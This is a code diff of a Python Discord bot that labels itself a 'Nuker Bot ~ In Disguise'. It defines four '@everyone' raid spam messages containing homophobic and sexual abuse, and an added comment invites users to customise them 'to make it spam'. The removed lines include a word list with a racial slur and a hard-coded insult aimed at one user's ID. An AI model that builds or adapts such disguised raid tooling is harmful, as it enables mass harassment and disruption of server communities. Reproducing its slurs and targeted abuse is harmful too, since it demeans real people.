@@ -7,12 +7,16 @@ import random
 # DEFENITIONS
 client = discord.Client()
 keyword = ("yeah")
-bad_words = ["fuck", "shit", "pussy", "nigga", "cock"]
+# this is the reply keyword ^^
 randomint = random.randint(1, 23)
-nukesmall = ("@everyone this is smol nuke uwu >-< YEAH NAH SIKE THAT FURRY SHIT IS GAYYYYY")
+# ignore this but keep it ^^
+
+nukesmall = ("@everyone this is smol nuke uwu >-< YEAH NAH SIKE THAT FURRY SHIT IS GAYYYYY") 
 nukebig = (" @everyone SENPAI HUGE DICK NUKE RAID")
 nukerape = ("@everyone hey what's up, how you doing?")
 nuketrashcan = ("@everyone GET NUKED, ALL HAIL MEEEEEE")
+
+# ^^ these are the  four nuke options, change this to whatever you want to make it spam ^^
 
 
 
@@ -21,26 +25,6 @@ nuketrashcan = ("@everyone GET NUKED, ALL HAIL MEEEEEE")
 @client.event 
 async def on_ready():
     await client.change_presence(activity=discord.Game('$help'))
-    general_channel  = client.get_channel(911197678879264768)
-    ninas_channel  = client.get_channel(919880993807151134)
-    await general_channel.send("██████╗░░█████╗░███████╗███████╗██╗░██████╗██╗░░██╗")
-    await general_channel.send("██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔════╝██║░░██║")
-    await general_channel.send("██████╔╝███████║█████╗░░█████╗░░██║╚█████╗░███████║")
-    await general_channel.send("██╔══██╗██╔══██║██╔══╝░░██╔══╝░░██║░╚═══██╗██╔══██║")
-    await general_channel.send("██║░░██║██║░░██║██║░░░░░██║░░░░░██║██████╔╝██║░░██║")
-    await general_channel.send("╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚═╝")
-    await general_channel.send("**IS ONLINE**")
-    await general_channel.send("~")
-    await general_channel.send("Made by ~ asuhopoljac_")
-    await ninas_channel.send("██████╗░░█████╗░███████╗███████╗██╗░██████╗██╗░░██╗")
-    await ninas_channel.send("██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔════╝██║░░██║")
-    await ninas_channel.send("██████╔╝███████║█████╗░░█████╗░░██║╚█████╗░███████║")
-    await ninas_channel.send("██╔══██╗██╔══██║██╔══╝░░██╔══╝░░██║░╚═══██╗██╔══██║")
-    await ninas_channel.send("██║░░██║██║░░██║██║░░░░░██║░░░░░██║██████╔╝██║░░██║")
-    await ninas_channel.send("╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚═╝")
-    await ninas_channel.send("**IS ONLINE**")
-    await ninas_channel.send("~")
-    await ninas_channel.send("Made by ~ asuhopoljac_")
     print ("-")
     print ("██████╗░░█████╗░███████╗███████╗██╗░██████╗██╗░░██╗")
     print ("██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔════╝██║░░██║")
@@ -49,7 +33,7 @@ async def on_ready():
     print ("██║░░██║██║░░██║██║░░░░░██║░░░░░██║██████╔╝██║░░██║")
     print ("╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚═╝")
     print ("Discord Nuker Bot ~ In Disguise")
-    print ("Made By ~ asuhopoljac ~")
+    print ("Made By asuhopoljac ")
     
 
 
@@ -6027,14 +6011,13 @@ async def on_message(message):
 
     message_text = message.content.strip()
     if keyword in message_text:
-            # do something here, change to whatever you want
             if message.author == client.user:
                 return
             await message.channel.send ("yeah... nah.")
-
-
-    if message.author.id == ('894204130669772851'):
-        await message.channel.send ("shut the fuck up rohaan you pasty bitch")
+            
+            # This is just to annoy people and make the bot reply to anyone when they say "yeah", with "yeah... nah"
+            
+            # feel free to change what i replys and what the keyword is (keyword on the top of the code) 
             
             
 
